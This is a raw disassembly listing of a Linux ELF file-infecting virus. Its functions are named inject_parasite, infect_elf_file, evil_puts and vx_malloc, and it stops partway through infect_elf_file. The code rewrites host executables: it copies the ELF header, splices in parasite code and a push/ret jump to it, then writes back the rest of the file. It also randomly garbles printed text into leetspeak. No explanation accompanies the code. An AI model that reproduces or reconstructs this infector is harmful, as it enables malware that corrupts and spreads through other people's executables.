
virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  4001a0:	55                   	push   rbp
  4001a1:	48 89 e5             	mov    rbp,rsp

00000000004001a4 <real_start>:
  4001a4:	54                   	push   rsp
  4001a5:	55                   	push   rbp
  4001a6:	50                   	push   rax
  4001a7:	53                   	push   rbx
  4001a8:	51                   	push   rcx
  4001a9:	52                   	push   rdx
  4001aa:	41 50                	push   r8
  4001ac:	41 51                	push   r9
  4001ae:	41 52                	push   r10
  4001b0:	41 53                	push   r11
  4001b2:	41 54                	push   r12
  4001b4:	41 55                	push   r13
  4001b6:	41 56                	push   r14
  4001b8:	41 57                	push   r15
  4001ba:	e8 e9 1a 00 00       	call   401ca8 <do_main>
  4001bf:	41 5f                	pop    r15
  4001c1:	41 5e                	pop    r14
  4001c3:	41 5d                	pop    r13
  4001c5:	41 5c                	pop    r12
  4001c7:	41 5b                	pop    r11
  4001c9:	41 5a                	pop    r10
  4001cb:	41 59                	pop    r9
  4001cd:	41 58                	pop    r8
  4001cf:	5a                   	pop    rdx
  4001d0:	59                   	pop    rcx
  4001d1:	5b                   	pop    rbx
  4001d2:	58                   	pop    rax
  4001d3:	5d                   	pop    rbp
  4001d4:	5c                   	pop    rsp
  4001d5:	48 83 c4 08          	add    rsp,0x8
  4001d9:	e9 34 2b 00 00       	jmp    402d12 <end_code>
  4001de:	90                   	nop
  4001df:	5d                   	pop    rbp
  4001e0:	c3                   	ret    

00000000004001e1 <evil_puts>:
  4001e1:	f3 0f 1e fa          	endbr64 
  4001e5:	55                   	push   rbp
  4001e6:	48 89 e5             	mov    rbp,rsp
  4001e9:	48 81 ec 40 04 00 00 	sub    rsp,0x440
  4001f0:	48 89 bd c8 fb ff ff 	mov    QWORD PTR [rbp-0x438],rdi
  4001f7:	48 8b 85 c8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x438]
  4001fe:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400202:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  400209:	c7 45 ec 05 00 00 00 	mov    DWORD PTR [rbp-0x14],0x5
  400210:	48 8d 85 d0 fb ff ff 	lea    rax,[rbp-0x430]
  400217:	be 00 00 00 00       	mov    esi,0x0
  40021c:	48 89 c7             	mov    rdi,rax
  40021f:	e8 6b 21 00 00       	call   40238f <_gettimeofday>
  400224:	48 8d 85 d0 fb ff ff 	lea    rax,[rbp-0x430]
  40022b:	48 83 c0 08          	add    rax,0x8
  40022f:	48 89 c7             	mov    rdi,rax
  400232:	e8 e1 01 00 00       	call   400418 <_rand>
  400237:	99                   	cdq    
  400238:	f7 7d ec             	idiv   DWORD PTR [rbp-0x14]
  40023b:	89 d0                	mov    eax,edx
  40023d:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  400240:	83 7d f0 03          	cmp    DWORD PTR [rbp-0x10],0x3
  400244:	0f 85 2a 01 00 00    	jne    400374 <evil_puts+0x193>
  40024a:	48 8d 85 e0 fb ff ff 	lea    rax,[rbp-0x420]
  400251:	ba 00 04 00 00       	mov    edx,0x400
  400256:	be 00 00 00 00       	mov    esi,0x0
  40025b:	48 89 c7             	mov    rdi,rax
  40025e:	e8 ad 21 00 00       	call   402410 <Memset>
  400263:	e9 e3 00 00 00       	jmp    40034b <evil_puts+0x16a>
  400268:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40026c:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40026f:	0f be c0             	movsx  eax,al
  400272:	89 c7                	mov    edi,eax
  400274:	e8 1f 29 00 00       	call   402b98 <_toupper>
  400279:	0f be c0             	movsx  eax,al
  40027c:	83 e8 41             	sub    eax,0x41
  40027f:	83 f8 13             	cmp    eax,0x13
  400282:	0f 87 a4 00 00 00    	ja     40032c <evil_puts+0x14b>
  400288:	89 c0                	mov    eax,eax
  40028a:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  400291:	00 
  400292:	48 8d 05 c7 2a 00 00 	lea    rax,[rip+0x2ac7]        # 402d60 <display_skeksi+0x2d>
  400299:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  40029c:	48 98                	cdqe   
  40029e:	48 8d 15 bb 2a 00 00 	lea    rdx,[rip+0x2abb]        # 402d60 <display_skeksi+0x2d>
  4002a5:	48 01 d0             	add    rax,rdx
  4002a8:	3e ff e0             	notrack jmp rax
  4002ab:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002ae:	8d 50 01             	lea    edx,[rax+0x1]
  4002b1:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002b4:	48 98                	cdqe   
  4002b6:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x31
  4002bd:	31 
  4002be:	e9 83 00 00 00       	jmp    400346 <evil_puts+0x165>
  4002c3:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002c6:	8d 50 01             	lea    edx,[rax+0x1]
  4002c9:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002cc:	48 98                	cdqe   
  4002ce:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x33
  4002d5:	33 
  4002d6:	eb 6e                	jmp    400346 <evil_puts+0x165>
  4002d8:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002db:	8d 50 01             	lea    edx,[rax+0x1]
  4002de:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002e1:	48 98                	cdqe   
  4002e3:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x35
  4002ea:	35 
  4002eb:	eb 59                	jmp    400346 <evil_puts+0x165>
  4002ed:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002f0:	8d 50 01             	lea    edx,[rax+0x1]
  4002f3:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002f6:	48 98                	cdqe   
  4002f8:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x37
  4002ff:	37 
  400300:	eb 44                	jmp    400346 <evil_puts+0x165>
  400302:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  400305:	8d 50 01             	lea    edx,[rax+0x1]
  400308:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  40030b:	48 98                	cdqe   
  40030d:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x30
  400314:	30 
  400315:	eb 2f                	jmp    400346 <evil_puts+0x165>
  400317:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40031a:	8d 50 01             	lea    edx,[rax+0x1]
  40031d:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400320:	48 98                	cdqe   
  400322:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x34
  400329:	34 
  40032a:	eb 1a                	jmp    400346 <evil_puts+0x165>
  40032c:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40032f:	8d 50 01             	lea    edx,[rax+0x1]
  400332:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400335:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  400339:	0f b6 12             	movzx  edx,BYTE PTR [rdx]
  40033c:	48 98                	cdqe   
  40033e:	88 94 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],dl
  400345:	90                   	nop
  400346:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  40034b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40034f:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400352:	84 c0                	test   al,al
  400354:	74 0d                	je     400363 <evil_puts+0x182>
  400356:	81 7d f4 ff 03 00 00 	cmp    DWORD PTR [rbp-0xc],0x3ff
  40035d:	0f 8e 05 ff ff ff    	jle    400268 <evil_puts+0x87>
  400363:	48 8d 85 e0 fb ff ff 	lea    rax,[rbp-0x420]
  40036a:	48 89 c7             	mov    rdi,rax
  40036d:	e8 9c 27 00 00       	call   402b0e <_puts_nl>
  400372:	eb 14                	jmp    400388 <evil_puts+0x1a7>
  400374:	90                   	nop
  400375:	f3 0f 1e fa          	endbr64 
  400379:	48 8b 85 c8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x438]
  400380:	48 89 c7             	mov    rdi,rax
  400383:	e8 86 27 00 00       	call   402b0e <_puts_nl>
  400388:	c9                   	leave  
  400389:	c3                   	ret    

000000000040038a <vx_malloc>:
  40038a:	f3 0f 1e fa          	endbr64 
  40038e:	55                   	push   rbp
  40038f:	48 89 e5             	mov    rbp,rsp
  400392:	48 83 ec 10          	sub    rsp,0x10
  400396:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  40039a:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  40039e:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003a2:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003a5:	48 85 c0             	test   rax,rax
  4003a8:	75 46                	jne    4003f0 <vx_malloc+0x66>
  4003aa:	41 b9 00 00 00 00    	mov    r9d,0x0
  4003b0:	49 c7 c0 ff ff ff ff 	mov    r8,0xffffffffffffffff
  4003b7:	b9 22 00 00 00       	mov    ecx,0x22
  4003bc:	ba 03 00 00 00       	mov    edx,0x3
  4003c1:	be 00 00 20 00       	mov    esi,0x200000
  4003c6:	bf 00 00 00 00       	mov    edi,0x0
  4003cb:	e8 42 1e 00 00       	call   402212 <_mmap>
  4003d0:	48 8b 55 f0          	mov    rdx,QWORD PTR [rbp-0x10]
  4003d4:	48 89 02             	mov    QWORD PTR [rdx],rax
  4003d7:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003db:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003de:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  4003e2:	75 0c                	jne    4003f0 <vx_malloc+0x66>
  4003e4:	48 c7 c7 ff ff ff ff 	mov    rdi,0xffffffffffffffff
  4003eb:	e8 67 1c 00 00       	call   402057 <Exit>
  4003f0:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003f4:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003f7:	48 8d 90 00 01 00 00 	lea    rdx,[rax+0x100]
  4003fe:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400402:	48 89 10             	mov    QWORD PTR [rax],rdx
  400405:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400409:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40040c:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  400410:	48 f7 da             	neg    rdx
  400413:	48 01 d0             	add    rax,rdx
  400416:	c9                   	leave  
  400417:	c3                   	ret    

0000000000400418 <_rand>:
  400418:	55                   	push   rbp
  400419:	48 89 e5             	mov    rbp,rsp
  40041c:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  400420:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400424:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400427:	48 69 c0 6d 4e c6 41 	imul   rax,rax,0x41c64e6d
  40042e:	48 8d 90 39 30 00 00 	lea    rdx,[rax+0x3039]
  400435:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400439:	48 89 10             	mov    QWORD PTR [rax],rdx
  40043c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400440:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400443:	48 8d 90 ff ff 00 00 	lea    rdx,[rax+0xffff]
  40044a:	48 85 c0             	test   rax,rax
  40044d:	48 0f 48 c2          	cmovs  rax,rdx
  400451:	48 c1 f8 10          	sar    rax,0x10
  400455:	25 ff 7f 00 00       	and    eax,0x7fff
  40045a:	5d                   	pop    rbp
  40045b:	c3                   	ret    

000000000040045c <randomly_select_dir>:
  40045c:	55                   	push   rbp
  40045d:	48 89 e5             	mov    rbp,rsp
  400460:	48 83 ec 30          	sub    rsp,0x30
  400464:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400468:	c7 45 fc 04 00 00 00 	mov    DWORD PTR [rbp-0x4],0x4
  40046f:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  400473:	be 00 00 00 00       	mov    esi,0x0
  400478:	48 89 c7             	mov    rdi,rax
  40047b:	e8 0f 1f 00 00       	call   40238f <_gettimeofday>
  400480:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  400484:	48 83 c0 08          	add    rax,0x8
  400488:	48 89 c7             	mov    rdi,rax
  40048b:	e8 88 ff ff ff       	call   400418 <_rand>
  400490:	99                   	cdq    
  400491:	f7 7d fc             	idiv   DWORD PTR [rbp-0x4]
  400494:	89 d0                	mov    eax,edx
  400496:	89 c0                	mov    eax,eax
  400498:	48 8d 14 c5 00 00 00 	lea    rdx,[rax*8+0x0]
  40049f:	00 
  4004a0:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004a4:	48 01 d0             	add    rax,rdx
  4004a7:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4004aa:	c9                   	leave  
  4004ab:	c3                   	ret    

00000000004004ac <full_path>:
  4004ac:	f3 0f 1e fa          	endbr64 
  4004b0:	55                   	push   rbp
  4004b1:	48 89 e5             	mov    rbp,rsp
  4004b4:	53                   	push   rbx
  4004b5:	48 83 ec 38          	sub    rsp,0x38
  4004b9:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  4004bd:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  4004c1:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  4004c5:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004c9:	48 89 c7             	mov    rdi,rax
  4004cc:	e8 94 26 00 00       	call   402b65 <_strlen>
  4004d1:	48 89 c3             	mov    rbx,rax
  4004d4:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4004d8:	48 89 c7             	mov    rdi,rax
  4004db:	e8 85 26 00 00       	call   402b65 <_strlen>
  4004e0:	48 01 d8             	add    rax,rbx
  4004e3:	48 8d 50 02          	lea    rdx,[rax+0x2]
  4004e7:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4004eb:	48 89 c6             	mov    rsi,rax
  4004ee:	48 89 d7             	mov    rdi,rdx
  4004f1:	e8 94 fe ff ff       	call   40038a <vx_malloc>
  4004f6:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4004fa:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004fe:	48 89 c7             	mov    rdi,rax
  400501:	e8 5f 26 00 00       	call   402b65 <_strlen>
  400506:	89 c3                	mov    ebx,eax
  400508:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40050c:	48 89 c7             	mov    rdi,rax
  40050f:	e8 51 26 00 00       	call   402b65 <_strlen>
  400514:	8d 14 03             	lea    edx,[rbx+rax*1]
  400517:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40051b:	be 00 00 00 00       	mov    esi,0x0
  400520:	48 89 c7             	mov    rdi,rax
  400523:	e8 e8 1e 00 00       	call   402410 <Memset>
  400528:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40052c:	48 89 c7             	mov    rdi,rax
  40052f:	e8 31 26 00 00       	call   402b65 <_strlen>
  400534:	89 c2                	mov    edx,eax
  400536:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  40053a:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40053e:	48 89 ce             	mov    rsi,rcx
  400541:	48 89 c7             	mov    rdi,rax
  400544:	e8 74 1e 00 00       	call   4023bd <_memcpy>
  400549:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40054d:	48 89 c7             	mov    rdi,rax
  400550:	e8 10 26 00 00       	call   402b65 <_strlen>
  400555:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  400559:	48 01 d0             	add    rax,rdx
  40055c:	c6 00 2f             	mov    BYTE PTR [rax],0x2f
  40055f:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400563:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400566:	3c 2e                	cmp    al,0x2e
  400568:	75 14                	jne    40057e <full_path+0xd2>
  40056a:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  40056e:	48 83 c0 01          	add    rax,0x1
  400572:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400575:	3c 2f                	cmp    al,0x2f
  400577:	75 05                	jne    40057e <full_path+0xd2>
  400579:	48 83 45 d8 02       	add    QWORD PTR [rbp-0x28],0x2
  40057e:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400582:	48 89 c7             	mov    rdi,rax
  400585:	e8 db 25 00 00       	call   402b65 <_strlen>
  40058a:	89 c3                	mov    ebx,eax
  40058c:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400590:	48 89 c7             	mov    rdi,rax
  400593:	e8 cd 25 00 00       	call   402b65 <_strlen>
  400598:	48 8d 50 01          	lea    rdx,[rax+0x1]
  40059c:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005a0:	48 8d 0c 02          	lea    rcx,[rdx+rax*1]
  4005a4:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4005a8:	89 da                	mov    edx,ebx
  4005aa:	48 89 c6             	mov    rsi,rax
  4005ad:	48 89 cf             	mov    rdi,rcx
  4005b0:	e8 08 1e 00 00       	call   4023bd <_memcpy>
  4005b5:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005b9:	48 83 c4 38          	add    rsp,0x38
  4005bd:	5b                   	pop    rbx
  4005be:	5d                   	pop    rbp
  4005bf:	c3                   	ret    

00000000004005c0 <inject_parasite>:
  4005c0:	f3 0f 1e fa          	endbr64 
  4005c4:	55                   	push   rbp
  4005c5:	48 89 e5             	mov    rbp,rsp
  4005c8:	48 81 ec 30 01 00 00 	sub    rsp,0x130
  4005cf:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  4005d6:	48 89 b5 f0 fe ff ff 	mov    QWORD PTR [rbp-0x110],rsi
  4005dd:	48 89 95 e8 fe ff ff 	mov    QWORD PTR [rbp-0x118],rdx
  4005e4:	48 89 8d e0 fe ff ff 	mov    QWORD PTR [rbp-0x120],rcx
  4005eb:	4c 89 85 d8 fe ff ff 	mov    QWORD PTR [rbp-0x128],r8
  4005f2:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4005f9:	c7 45 f8 40 00 00 00 	mov    DWORD PTR [rbp-0x8],0x40
  400600:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400607:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40060b:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40060f:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  400616:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40061a:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40061e:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400625:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  400629:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  40062d:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400634:	48 8d 48 68          	lea    rcx,[rax+0x68]
  400638:	48 8d 85 10 ff ff ff 	lea    rax,[rbp-0xf0]
  40063f:	ba 90 00 00 00       	mov    edx,0x90
  400644:	48 89 ce             	mov    rsi,rcx
  400647:	48 89 c7             	mov    rdi,rax
  40064a:	e8 6e 1d 00 00       	call   4023bd <_memcpy>
  40064f:	8b 85 28 ff ff ff    	mov    eax,DWORD PTR [rbp-0xd8]
  400655:	89 c0                	mov    eax,eax
  400657:	48 89 c2             	mov    rdx,rax
  40065a:	be 41 02 00 00       	mov    esi,0x241
  40065f:	48 8d 3d 4a 27 00 00 	lea    rdi,[rip+0x274a]        # 402db0 <display_skeksi+0x7d>
  400666:	e8 0b 1a 00 00       	call   402076 <_open>
  40066b:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  40066e:	83 7d dc ff          	cmp    DWORD PTR [rbp-0x24],0xffffffff
  400672:	75 0a                	jne    40067e <inject_parasite+0xbe>
  400674:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400679:	e9 de 01 00 00       	jmp    40085c <inject_parasite+0x29c>
  40067e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400681:	48 63 d0             	movsxd rdx,eax
  400684:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400687:	48 98                	cdqe   
  400689:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  40068d:	48 89 ce             	mov    rsi,rcx
  400690:	48 89 c7             	mov    rdi,rax
  400693:	e8 68 1a 00 00       	call   402100 <_write>
  400698:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  40069b:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40069e:	39 45 d8             	cmp    DWORD PTR [rbp-0x28],eax
  4006a1:	74 0a                	je     4006ad <inject_parasite+0xed>
  4006a3:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4006a8:	e9 af 01 00 00       	jmp    40085c <inject_parasite+0x29c>
  4006ad:	e8 45 26 00 00       	call   402cf7 <get_rip>
  4006b2:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  4006b9:	48 89 d1             	mov    rcx,rdx
  4006bc:	48 c7 c2 12 2d 40 00 	mov    rdx,0x402d12
  4006c3:	48 29 d1             	sub    rcx,rdx
  4006c6:	48 89 ca             	mov    rdx,rcx
  4006c9:	48 29 d0             	sub    rax,rdx
  4006cc:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4006d0:	e8 22 26 00 00       	call   402cf7 <get_rip>
  4006d5:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  4006dc:	48 89 d1             	mov    rcx,rdx
  4006df:	48 c7 c2 27 2d 40 00 	mov    rdx,0x402d27
  4006e6:	48 29 d1             	sub    rcx,rdx
  4006e9:	48 89 ca             	mov    rdx,rcx
  4006ec:	48 29 d0             	sub    rax,rdx
  4006ef:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  4006f3:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4006f7:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  4006fb:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  4006fe:	e8 f4 25 00 00       	call   402cf7 <get_rip>
  400703:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  40070a:	48 89 d1             	mov    rcx,rdx
  40070d:	48 c7 c2 12 2d 40 00 	mov    rdx,0x402d12
  400714:	48 29 d1             	sub    rcx,rdx
  400717:	48 89 ca             	mov    rdx,rcx
  40071a:	48 29 d0             	sub    rax,rdx
  40071d:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  400721:	c7 85 0a ff ff ff 68 	mov    DWORD PTR [rbp-0xf6],0x68
  400728:	00 00 00 
  40072b:	66 c7 85 0e ff ff ff 	mov    WORD PTR [rbp-0xf2],0xc300
  400732:	00 c3 
  400734:	48 8d 85 0a ff ff ff 	lea    rax,[rbp-0xf6]
  40073b:	48 83 c0 01          	add    rax,0x1
  40073f:	48 8b 95 d8 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x128]
  400746:	89 10                	mov    DWORD PTR [rax],edx
  400748:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  40074f:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400753:	48 2d 68 42 00 00    	sub    rax,0x4268
  400759:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  40075d:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  400760:	48 98                	cdqe   
  400762:	48 29 45 b0          	sub    QWORD PTR [rbp-0x50],rax
  400766:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400769:	48 98                	cdqe   
  40076b:	48 8b 55 b0          	mov    rdx,QWORD PTR [rbp-0x50]
  40076f:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  400773:	48 89 ce             	mov    rsi,rcx
  400776:	48 89 c7             	mov    rdi,rax
  400779:	e8 82 19 00 00       	call   402100 <_write>
  40077e:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400781:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400784:	48 39 45 b0          	cmp    QWORD PTR [rbp-0x50],rax
  400788:	74 0a                	je     400794 <inject_parasite+0x1d4>
  40078a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40078f:	e9 c8 00 00 00       	jmp    40085c <inject_parasite+0x29c>
  400794:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400797:	48 98                	cdqe   
  400799:	48 8d 8d 0a ff ff ff 	lea    rcx,[rbp-0xf6]
  4007a0:	ba 06 00 00 00       	mov    edx,0x6
  4007a5:	48 89 ce             	mov    rsi,rcx
  4007a8:	48 89 c7             	mov    rdi,rax
  4007ab:	e8 50 19 00 00       	call   402100 <_write>
  4007b0:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  4007b3:	48 98                	cdqe   
  4007b5:	48 8d 90 62 42 00 00 	lea    rdx,[rax+0x4262]
  4007bc:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  4007c0:	48 8d 48 06          	lea    rcx,[rax+0x6]
  4007c4:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4007c8:	48 01 c1             	add    rcx,rax
  4007cb:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4007ce:	48 98                	cdqe   
  4007d0:	48 89 ce             	mov    rsi,rcx
  4007d3:	48 89 c7             	mov    rdi,rax
  4007d6:	e8 25 19 00 00       	call   402100 <_write>
  4007db:	48 8b 85 f0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x110]
  4007e2:	83 c0 40             	add    eax,0x40
  4007e5:	89 45 ac             	mov    DWORD PTR [rbp-0x54],eax
  4007e8:	8b 4d ac             	mov    ecx,DWORD PTR [rbp-0x54]
  4007eb:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4007ee:	48 98                	cdqe   
  4007f0:	ba 00 00 00 00       	mov    edx,0x0
  4007f5:	48 89 ce             	mov    rsi,rcx
  4007f8:	48 89 c7             	mov    rdi,rax
  4007fb:	e8 b8 19 00 00       	call   4021b8 <_lseek>
  400800:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400803:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400806:	3b 45 ac             	cmp    eax,DWORD PTR [rbp-0x54]
  400809:	74 07                	je     400812 <inject_parasite+0x252>
  40080b:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400810:	eb 4a                	jmp    40085c <inject_parasite+0x29c>
  400812:	48 83 45 f0 40       	add    QWORD PTR [rbp-0x10],0x40
  400817:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40081e:	83 e8 40             	sub    eax,0x40
  400821:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
  400824:	8b 55 a8             	mov    edx,DWORD PTR [rbp-0x58]
  400827:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  40082a:	48 98                	cdqe   
  40082c:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  400830:	48 89 ce             	mov    rsi,rcx
  400833:	48 89 c7             	mov    rdi,rax
  400836:	e8 c5 18 00 00       	call   402100 <_write>
  40083b:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  40083e:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400841:	3b 45 a8             	cmp    eax,DWORD PTR [rbp-0x58]
  400844:	74 07                	je     40084d <inject_parasite+0x28d>
  400846:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40084b:	eb 0f                	jmp    40085c <inject_parasite+0x29c>
  40084d:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400850:	89 c7                	mov    edi,eax
  400852:	e8 55 18 00 00       	call   4020ac <_close>
  400857:	b8 00 00 00 00       	mov    eax,0x0
  40085c:	c9                   	leave  
  40085d:	c3                   	ret    

000000000040085e <infect_elf_file>:
  40085e:	f3 0f 1e fa          	endbr64 
  400862:	55                   	push   rbp
  400863:	48 89 e5             	mov    rbp,rsp
  400866:	48 81 ec 00 01 00 00 	sub    rsp,0x100
  40086d:	48 89 bd 08 ff ff ff 	mov    QWORD PTR [rbp-0xf8],rdi
  400874:	48 89 b5 00 ff ff ff 	mov    QWORD PTR [rbp-0x100],rsi
  40087b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  400882:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400889:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  40088d:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
